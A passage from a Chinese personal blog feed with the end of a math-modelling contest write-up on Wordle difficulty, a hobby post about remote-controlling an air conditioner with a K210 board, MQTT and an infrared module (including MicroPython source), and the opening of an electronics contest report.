<p>上表显示了2023年3月1日玩家尝试过关的次数（1,2,3,4,5,6,X）百分比的预测结果。其中，成功百分比第四次是最高的，也就是说这个单词的难度在中间。 由于该单词有3个重复字母，并且没有高频前缀后缀，因此第一次猜测成功的概率几乎为零。 不过，三个重复的字母会增加玩家猜出该字母的概率，因此成功集中在接下来的几次。 单词的不同属性会影响玩家填写单词的选择，从而影响游戏结果。</p>
<h3 id="font-style-font-weight-700-color-B399FF-问题四-font"><font style="font-weight:700;color:#B399FF">问题四</font></h3>
<p>Q3：列出并描述这个数据集的其他一些有趣的特征。</p>
<h4 id="1-方法概述-3">1.方法概述</h4>
<p>第4题要求将单词按照难易程度进行分类，并分析每一类单词是否具有共同的性质。 方法概述流程图如下：</p>
<p><img src="https://s2.loli.net/2023/09/03/gCuRq5YcyIES1Uz.png" alt=""></p>
<p>引入基于时间序列全局主成分分析和熵权法的评价模型对词语难度进行评价，并通过聚类方法将其分为五个等级：困难、困难、中等困难、简单和较简单。 分析各年级单词的相同特征，计算单词“EERIE”的类别，以确定分类的合理性。</p>
<h4 id="2-基于时间序列全局主成分分析（GPCA）的评价分类模型——熵权法（EWM）">2.基于时间序列全局主成分分析（GPCA）的评价分类模型——熵权法（EWM）</h4>
<p>利用时间序列全局主成分分析可以将剖面数据扩展为面板数据，保证评价体系的统一性、完整性和可比性。 另外，将原始数据降维为多个不相关的主成分，然后代入熵权法，可以防止无效信息的重复加权。 最后，根据每日难度评估分数的相关性对变量进行分组，使得变量在同一组中相关性较高，而在不同组中相关性较差。 然后可以分析不同组中的数据属性。</p>
<h5 id="（1）数据标准化与降维">（1）数据标准化与降维</h5>
<p>本文通过极差法标准化对数据进行统一变换，区分正负指标，然后通过Z核法对数据进行集中处理。 一般情况下，极差法将指标标准化为两类：正向指标越大越好，负向指标越小越好）。 Z-core法的标准化数据公式为：</p>
<p><img src="https://s2.loli.net/2023/09/03/t4OocICmhRLn9ki.png" alt=""></p>
<h5 id="（2）时间序列全局主成分分析（GPCA）">（2）时间序列全局主成分分析（GPCA）</h5>
<p>将选择难度模式的标准化人数比例和正确人数比例引入时间序列主成分分析模型，得到每日游戏难度评价值。 时间序列全局主成分分析方法可以用以下模型表示：</p>
<p><img src="https://s2.loli.net/2023/09/03/s4ecbDWYORNJLxh.png" alt=""></p>
<h4 id="3-结果分析-2">3.结果分析</h4>
<p><img src="https://s2.loli.net/2023/09/03/halQ9SPITLiU5Ok.png" alt=""></p>
<p>通过聚类分析，根据词的常见频率、字母重复次数、词的前缀和后缀这四个因素对(1, 2 、3、4、5、6、X）。 与这五个类别相关的给定单词是最接近百分比的平均分数、重复单词的数量、单词的频率、字母重复的数量以及词缀的相关频率。 经过模型分析，EERIE一词被归为第三类。</p>
<h3 id="参考文献">参考文献</h3>
<p>[1]Tang Qiyi, Tang Jie. Application of Partial Least Squares Regression Analysis in Uniform Design Experiment Modeling Analysis [J]. Mathematical Statistics and Management, 2005, 24(5):6.</p>
<p>[2]Wang Junping, Chen Quanshi. Gray-neural network comprehensive forecasting model [J]. Computer Engineering and Application, 2004, 40(9):3.</p>
<p>[3]Guo Xiping, Wang Lidong. New Algorithm and Application of Empirical Mode Decomposition (EMD). Noise and Vibration Control, 2008, 28(5):3.</p>
<p>[4]Deng Xinyang, Deng Yong, Zhang Yajuan, et al. A reliability Markov model and its application [J]. Acta Automatica Sinica, 2012, 38(4):666-672.</p>
<p>[5]Wang Li, Wang Zhengou. TGSOM: A Dynamic Self-Organizing Map Neural Network for Data Clustering [J]. Journal of Electronics and Information Technology, 2003, 25(3):7.</p>
<p>[6]Zhang Haoran, Wang Xiaodong. Incremental and online learning algorithms for regression least squares support vector machines [J]. Journal of Computers, 2006, 29(3):7.</p>
<p>[7]Yan Weiwu, Shao Huihe. Comparison and Application of Support Vector Machine and Least Squares Support Vector Machine [J]. Control and Decision Making, 2003, 18(3):3.</p>
<p>[8]Cheng Qiyue. Structural entropy weight method for determining evaluation index weights [J]. Systems Engineering Theory and Practice, 2010(7):4.</p>
<p>[9]Yang Linyun, Zhou Haijing, Zhuo Qing, et al. Weighted clustering fusion based on attribute importance [J]. Computer Science, 2009, 36(4):4.</p>
<p>[10]Ma Chunlong, Shi Xiaoqing, Xu Weiwei, Ren Jinghua, Wang Pei, Wu Jichun. Correlation analysis of multiple monitoring indicators of polluted sites based on self-organizing neural network [J]. Hydrogeology and Engineering Geology, 2021,48(03):191-202 .</p>
<p>[11]Zeng Ming, Lv Chunquan, Tian Kuo, Xue Song. Least squares support vector machine short-term load forecasting method based on bacterial community chemotaxis optimization [J]. Chinese Journal of Electrical Engineering, 2011, 31(34): 93-99 +11.</p>
<p>[12]Fu Meiping, Ma Hongwei, Mao Jianrong. Short-term forecasting of photovoltaic power generation based on similar day and least squares support vector machine [J]. Power System Protection and Control, 2012,40(16):65-69.</p>
<p>[13]Ge Shaoyun, Jia Ousha, Liu Hong. Short-term power load forecasting under real-time electricity price conditions based on genetic gray neural network model [J]. Power Grid Technology, 2012,36(01):224-229.DOI:10.13335/j .1000-3673.pst.2012.01.041.</p>
<p>[14]Ye Lin, Liu Peng. Short-term wind power combination forecasting model based on empirical mode decomposition and support vector machine [J]. Chinese Journal of Electrical Engineering, 2011, 31(31): 102-108. DOI: 10.13334/j .0258-8013.pcsee.2011.31.014.</p>
<p>[15]Wang Yuefen, Wang Yishan. Discovery and Comparative Analysis of Public Opinion Themes of Different Communicators in the Communication Stage [J]. Modern Information, 2018, 38(09): 28-35+144.</p>
]]></content>
      <categories>
        <category>竞赛</category>
      </categories>
      <tags>
        <tag>ICM/MCM</tag>
      </tags>
  </entry>
  <entry>
    <title>远程控制空调物联网项目</title>
    <url>/project/AirWifi/</url>
    <content><![CDATA[<p>其实这个项目起源于同学不经意间的一句话——“要是能远程开空调就好了，这样回宿舍的时候总是凉快的！”</p>
<p>我回——“预算多少”（不是</p>
<p>因为手上的芯片不多了，STM丢光了，MSP430又不大会用，正好手上一块电赛剩来的K210，而且库封装也很友善，就打算用这个做主芯片来着手写一下这个项目。</p>
<h2 id="红外发射模块">红外发射模块</h2>
<p><img src="https://s2.loli.net/2022/08/04/y5jwDkXE6BHY13Z.png" alt=""></p>
<p>既然要实现空调的开关、定时等相关功能，红外发射模块是必不可少的，网上也有很多这样的模块，包括上位机店家也写好了，真是好不方便。我用的就是上图这一种，非常简洁、四针串口，也会给相关使用说明、硬件的规格手册等：</p>
<p><a href="https://ctgu.site:8003/index.php/s/TfwzeSTkn63dAFy" style="font-weight:700;color:#B399FF"><em>红外学习模块使用说明书</em></a></p>
<p><a href="https://ctgu.site:8003/index.php/s/rXDszsA5YgTJfEG" style="font-weight:700;color:#B399FF"><em>红外发射管-TSAL6400</em></a></p>
<p><img src="https://s2.loli.net/2022/08/04/t1aKoWEzbV2I7Tx.png" alt=""></p>
<p>使用手册中会有这种协议介绍，我们只需要按照固定的协议以及使用手册中特定的功能码串口传输数据即可。</p>
<h2 id="语音识别模块">语音识别模块</h2>
<p><img src="https://s2.loli.net/2022/08/04/7KJUdeBWo948vER.png" alt=""></p>
<p>语音识别模块我选择的是智家物联的SU-03T核心板，SU-03T 是一款低成本、低功耗、小体积的离线语音识别模组，能快速应用于智能家 居，各类智能小家电，86 盒，玩具，灯具等需要语音操控的产品。店家已经焊好PCB封装，接线方便</p>
<ul>
<li>32bit RISC 内核，运行频率 240M</li>
<li>支持 DSP 指令集以及 FPU 浮点运算单元</li>
<li>FFT 加速器：最大支持 1024 点复数 FFT/IFFT 运算，或者是 2048 点的实数 FFT/IFFT 运算</li>
<li>内置高速 SRAM，内置 2MB FLASH</li>
<li>内置 3W、单声道 AB 类功放</li>
<li>支持 1 路驻极体麦</li>
<li>支 持 I2S input/output</li>
<li>支持 5V 电源输入</li>
<li>内置 5V 转 3.3V，3.3V 外部负载不超过 150mA</li>
<li>RC 12MHz 时钟源和 PLL 锁相环时钟源</li>
<li>内 置 POR（Power on Reset），低电压检测和看门狗</li>
<li>所 有 GPIO 均可配置为外部中断输入和唤醒源</li>
<li>1 个标准 SPI Master 接口，最高速率 30MHz</li>
<li>1 个 SPI Slave 接口最高速率 30MHz</li>
<li>1 个全双工 UART 最高速率 3Mbps。</li>
<li>1 个 I2C 主/从控制器最高速率 400kHz</li>
<li>2 个 PWM 输出</li>
<li>1 个 12-bit SAR-ADC 最大 450Khz 采样率</li>
</ul>
<p>最最最最最重要的是！这个支持UI编程：</p>
<p><a href="http://www.smartpi.cn" style="font-weight:700;color:#B399FF"><em>智能公元/AIOT快速产品化平台</em></a></p>
<p>本来想只用这个实现远程控制+语音控制，但可惜只有一个UART，只好采用其他芯片。</p>
<h2 id="主芯片">主芯片</h2>
<p>其实打算用K210的时候很纠结的，因为这个板子功耗还是不低的，但我看中了他的库开发以及简介性，毕竟与其调硬件底层、我更喜欢写业务逻辑。（报错也是真的不好改<span class="emoji" alias="cry" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span></p>
<h3 id="语音识别">语音识别</h3>
<p>语音识别其实就是三个脉冲，UI编程的话很好设置，K210接受到后向红外串口发送信号，即可实现语音控制空调。</p>
<h3 id="MQTT通讯">MQTT通讯</h3>
<p>为了让K210与路由器进行连接，还需串口连接ESP8826，通讯方式选择MQTT。</p>
<p>当服务器和客户端建立起连接时，就可以相互通信了。在互联网应用大多使用 WebSocket 接口来传输数据。而在物联网应用中，常常出现这样的情况：海量的传感器，需要时刻保持在线，传输数据量非常低，有着大量用户使用。如果仍然使用 socket 作为通信，那么服务器的压力和通讯框架的设计随着数量的上升将变得异常复杂！ 那么有无一个框架协议来解决这个问题呢，答案是有的。那就是 MQTT(消息队列遥测传输)。</p>
<p>MQTT 是 IBM 于 1999 年提出的，和 HTTP 一样属于应用层，它工作在 TCP/IP 239 协议族上，通常还会调用 socket 接口。是一个基于客户端-服务器的消息发布/订 阅传输协议。其特点是协议是轻量、简单、开放和易于实现的，这些特点使它适 用范围非常广泛。在很多情况下，包括受限的环境中，如：机器与机器（M2M） 通信和物联网（IoT）。其在，通过卫星链路通信传感器、偶尔拨号的医疗设备、 智能家居、及一些小型化设备中已广泛使用。 总结下来 MQTT 有如下特性/优势： ➢ 异步消息协议 ➢ 面向长连接 ➢ 双向数据传输 ➢ 协议轻量级 ➢ 被动数据获取</p>
<p><img src="https://s2.loli.net/2022/08/04/3Wzf6UkpEmCFrMx.png" alt="MQTT流程图"></p>
<h3 id="源代码">源代码</h3>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> network<span class="token punctuation">,</span>time
<span class="token keyword">from</span> machine <span class="token keyword">import</span> UART<span class="token punctuation">,</span>Timer
<span class="token keyword">from</span> Maix <span class="token keyword">import</span> GPIO
<span class="token keyword">from</span> fpioa_manager <span class="token keyword">import</span> fm
<span class="token keyword">from</span> simple <span class="token keyword">import</span> MQTTClient

<span class="token comment"># User and Password</span>
SSID<span class="token operator">=</span><span class="token string">'xxxxxxxx'</span> <span class="token comment"># WiFi 账号</span>
KEY<span class="token operator">=</span><span class="token string">'xxxxxxxx'</span>  <span class="token comment"># WiFi 密码</span>

<span class="token comment"># Mic Control Init</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>GPIOHS4<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>GPIOHS5<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>GPIOHS6<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
open_air <span class="token operator">=</span> GPIO<span class="token punctuation">(</span>GPIO<span class="token punctuation">.</span>GPIOHS4<span class="token punctuation">,</span> GPIO<span class="token punctuation">.</span>IN<span class="token punctuation">)</span>
close_air <span class="token operator">=</span> GPIO<span class="token punctuation">(</span>GPIO<span class="token punctuation">.</span>GPIOHS5<span class="token punctuation">,</span> GPIO<span class="token punctuation">.</span>IN<span class="token punctuation">)</span>
time_air <span class="token operator">=</span> GPIO<span class="token punctuation">(</span>GPIO<span class="token punctuation">.</span>GPIOHS6<span class="token punctuation">,</span> GPIO<span class="token punctuation">.</span>IN<span class="token punctuation">)</span>

<span class="token comment"># Wifi En Pin</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>GPIOHS0<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
wifi_en<span class="token operator">=</span>GPIO<span class="token punctuation">(</span>GPIO<span class="token punctuation">.</span>GPIOHS0<span class="token punctuation">,</span> GPIO<span class="token punctuation">.</span>OUT<span class="token punctuation">)</span>

<span class="token comment"># Wifi Init</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>UART2_TX<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>UART2_RX<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
uart_wifi <span class="token operator">=</span> UART<span class="token punctuation">(</span>UART<span class="token punctuation">.</span>UART2<span class="token punctuation">,</span><span class="token number">115200</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">,</span>read_buf_len<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>
<span class="token comment"># Red Init</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>UART1_TX<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
fm<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> fm<span class="token punctuation">.</span>fpioa<span class="token punctuation">.</span>UART1_RX<span class="token punctuation">,</span> force<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
uart_red <span class="token operator">=</span> UART<span class="token punctuation">(</span>UART<span class="token punctuation">.</span>UART1<span class="token punctuation">,</span><span class="token number">115200</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">,</span>read_buf_len<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>

<span class="token comment"># WiFi</span>
<span class="token keyword">def</span> <span class="token function">wifi_enable</span><span class="token punctuation">(</span>en<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> wifi_en
    wifi_en<span class="token punctuation">.</span>value<span class="token punctuation">(</span>en<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">wifi_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> uart_wifi
    wifi_enable<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep_ms<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
    wifi_enable<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    uart_wifi <span class="token operator">=</span> UART<span class="token punctuation">(</span>UART<span class="token punctuation">.</span>UART2<span class="token punctuation">,</span><span class="token number">115200</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">,</span> read_buf_len<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>
    tmp <span class="token operator">=</span> uart_wifi<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    uart_wifi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"AT+UART_CUR=921600,8,1,0,0\r\n"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>uart_wifi<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># important! baudrate too low or read_buf_len too small will loose data</span>
    uart_wifi <span class="token operator">=</span> UART<span class="token punctuation">(</span>UART<span class="token punctuation">.</span>UART2<span class="token punctuation">,</span><span class="token number">921600</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">,</span> read_buf_len<span class="token operator">=</span><span class="token number">10240</span><span class="token punctuation">)</span>
    uart_wifi<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"AT\r\n"</span><span class="token punctuation">)</span>
    tmp <span class="token operator">=</span> uart_wifi<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> tmp<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"OK\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"reset fail"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        nic <span class="token operator">=</span> network<span class="token punctuation">.</span>ESP8285<span class="token punctuation">(</span>uart_wifi<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    <span class="token keyword">return</span> nic

<span class="token keyword">def</span> <span class="token function">MQTT_callback</span><span class="token punctuation">(</span>topic<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> uart_red

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'topic: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>topic<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'msg: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> msg <span class="token operator">==</span> <span class="token string">b'open'</span><span class="token punctuation">:</span>
        uart_red<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'\x68\x08\x00\xFF\x12\x01\x12\x16'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> msg <span class="token operator">==</span> <span class="token string">b'close'</span><span class="token punctuation">:</span>
        uart_red<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'\x68\x08\x00\xFF\x12\x00\x11\x16'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> msg <span class="token operator">==</span> <span class="token string">b'time'</span><span class="token punctuation">:</span>
        uart_red<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'\x68\x08\x00\xFF\x12\x02\x13\x16'</span><span class="token punctuation">)</span>
        
<span class="token keyword">def</span> <span class="token function">MQTT_Rev</span><span class="token punctuation">(</span>tim<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        client<span class="token punctuation">.</span>check_msg<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

<span class="token comment"># Connecting</span>
wlan <span class="token operator">=</span> wifi_init<span class="token punctuation">(</span><span class="token punctuation">)</span>
wlan<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>SSID<span class="token punctuation">,</span>KEY<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>wlan<span class="token punctuation">.</span>ifconfig<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># Mqtt Params</span>
SERVER <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
PORT <span class="token operator">=</span> <span class="token number">1883</span>
CLIENT_ID <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
USER <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
PASSWORD <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
TOPIC <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
client <span class="token operator">=</span> MQTTClient<span class="token punctuation">(</span>CLIENT_ID<span class="token punctuation">,</span> SERVER<span class="token punctuation">,</span> PORT<span class="token punctuation">,</span>user<span class="token operator">=</span>USER<span class="token punctuation">,</span> password<span class="token operator">=</span>PASSWORD<span class="token punctuation">)</span>
client<span class="token punctuation">.</span>set_callback<span class="token punctuation">(</span>MQTT_callback<span class="token punctuation">)</span>
client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
client<span class="token punctuation">.</span>subscribe<span class="token punctuation">(</span>TOPIC<span class="token punctuation">)</span>

tim <span class="token operator">=</span> Timer<span class="token punctuation">(</span>Timer<span class="token punctuation">.</span>TIMER0<span class="token punctuation">,</span> Timer<span class="token punctuation">.</span>CHANNEL0<span class="token punctuation">,</span> mode<span class="token operator">=</span>Timer<span class="token punctuation">.</span>MODE_PERIODIC<span class="token punctuation">,</span>period<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">,</span> callback<span class="token operator">=</span>MQTT_Rev<span class="token punctuation">)</span>

t_before <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token comment"># Reconnecting</span>
    <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t_before <span class="token operator">></span> <span class="token number">60</span><span class="token punctuation">:</span>
        <span class="token comment"># Disconnecting</span>
        client<span class="token punctuation">.</span>disconnect<span class="token punctuation">(</span><span class="token punctuation">)</span>
        tim<span class="token punctuation">.</span>deinit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># Connecting</span>
        wlan <span class="token operator">=</span> wifi_init<span class="token punctuation">(</span><span class="token punctuation">)</span>
        wlan<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>SSID<span class="token punctuation">,</span>KEY<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>wlan<span class="token punctuation">.</span>ifconfig<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment"># Mqtt Params</span>
        SERVER <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
        PORT <span class="token operator">=</span> <span class="token number">1883</span>
        CLIENT_ID <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
        USER <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
        PASSWORD <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
        TOPIC <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
        client <span class="token operator">=</span> MQTTClient<span class="token punctuation">(</span>CLIENT_ID<span class="token punctuation">,</span> SERVER<span class="token punctuation">,</span> PORT<span class="token punctuation">,</span>user<span class="token operator">=</span>USER<span class="token punctuation">,</span> password<span class="token operator">=</span>PASSWORD<span class="token punctuation">)</span>
        client<span class="token punctuation">.</span>set_callback<span class="token punctuation">(</span>MQTT_callback<span class="token punctuation">)</span>
        client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
        client<span class="token punctuation">.</span>subscribe<span class="token punctuation">(</span>TOPIC<span class="token punctuation">)</span>
        tim <span class="token operator">=</span> Timer<span class="token punctuation">(</span>Timer<span class="token punctuation">.</span>TIMER0<span class="token punctuation">,</span> Timer<span class="token punctuation">.</span>CHANNEL0<span class="token punctuation">,</span> mode<span class="token operator">=</span>Timer<span class="token punctuation">.</span>MODE_PERIODIC<span class="token punctuation">,</span>period<span class="token operator">=</span><span class="token number">300</span><span class="token punctuation">,</span> callback<span class="token operator">=</span>MQTT_Rev<span class="token punctuation">)</span>
        t_before <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># Mic</span>
    <span class="token keyword">if</span> open_air<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        uart_red<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'\x68\x08\x00\xFF\x12\x01\x12\x16'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> 
    <span class="token keyword">if</span> close_air<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        uart_red<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'\x68\x08\x00\xFF\x12\x00\x11\x16'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> time_air<span class="token punctuation">.</span>value<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        uart_red<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'\x68\x08\x00\xFF\x12\x02\x13\x16'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span></code></pre>
<h2 id="小程序前端">小程序前端</h2>
<p>MQTT服务器我选择的是环信即时通讯云</p>
<p><a href="https://docs-im.easemob.com/mqtt/intro">产品概述 IM 开发文档] (easemob.com)</a></p>
<p>该服务说明比较详细，快速收发demo也比较全，支持服务器端集成SDK、提供API接口，我好爱。<span class="emoji" alias="heart_eyes" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60d.png?v8">😍</span></p>
<p>收发demo云端我选择的是小程序收发，安装他介绍的操作步骤，补充api参数，初始化代码即可实现订阅功能。这里不做介绍啦。</p>
<h2 id="补充">补充</h2>
<p>这个项目其实也没有考虑很多，随便写一些罢了，不过，这里有很多有趣的还可以补充，像：</p>
<ol>
<li>你可以通过对接QQ机器人、微信机器人，实现QQ、微信发消息控制智能家居；</li>
<li>微信、QQ消息通过小爱同学播报；</li>
<li>通过人脸识别、人体检测，搭配任意摄像机，实现回家欢迎、出门关灯等操作；</li>
<li>让灯光颜色根据你电脑屏幕颜色来自动变化；</li>
<li>家里门打开了自动启动XXX游戏；</li>
<li>……………</li>
</ol>
]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>物联网</tag>
      </tags>
  </entry>
  <entry>
    <title>2022全国大学生电子设计竞赛</title>
    <url>/competition/nuedc_2/</url>
    <content><![CDATA[<p>本次竞赛为2022全国大学生电子设计竞赛C题（TI杯湖北省赛）。小编本科大二在读，电气专业。基础不好，不喜勿喷，感谢访问本网站，如果能给你提供新思路就是我最大的荣幸！</p>
<p>说实话这次算准备的不算很认真，赛前也没有针对相关模块及时进行补充学习。不过、从赛前的材料准备清单来看，基本和去年的题目很类似了。吸取去年的教训，这次准备了一些封装十分完善的MCU（有手就会那种🤫。不过因为这次是省赛，故主办方对芯片进行了限制——采用TI的MCU。（啊啊啊啊真的头疼<span class="emoji" alias="persevere" style="" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f623.png?v8">😣</span></p>
<p>首先我仅代表我的组员和我感谢比赛过程中帮助过我们的同学、指导老师、以及论坛上的网友们</p>
<h2 style="text-align:center;font-weight:700;color:#000">关于题目</h2>
<p>小车跟随行驶系统，设计一套小车跟随行驶系统，采用TI的MCU，由一辆领头小车和一辆跟随小车组成，要求小车具有循迹功能，且速度在0.3 ~ 1m/s可调，能在指定路径上完成行驶操作，行驶场地的路径如图1 所示。其中，路径上的A点为领头小车每次行驶的起始点和终点。当小车完成一次行驶到达终点，领头小车和跟随小车要发出声音提示。领头小车和跟随小车既可以沿着ABFDE圆角矩形（ 简称为<strong>内圈</strong> ）路径行驶，也可以沿着ABCDE的圆角矩形（ 简称为<strong>外圈</strong> ）路径行驶。</p>
<p><img src="https://s2.loli.net/2022/08/04/Kj3bODSVpUJxLMP.png" alt="图1"></p>
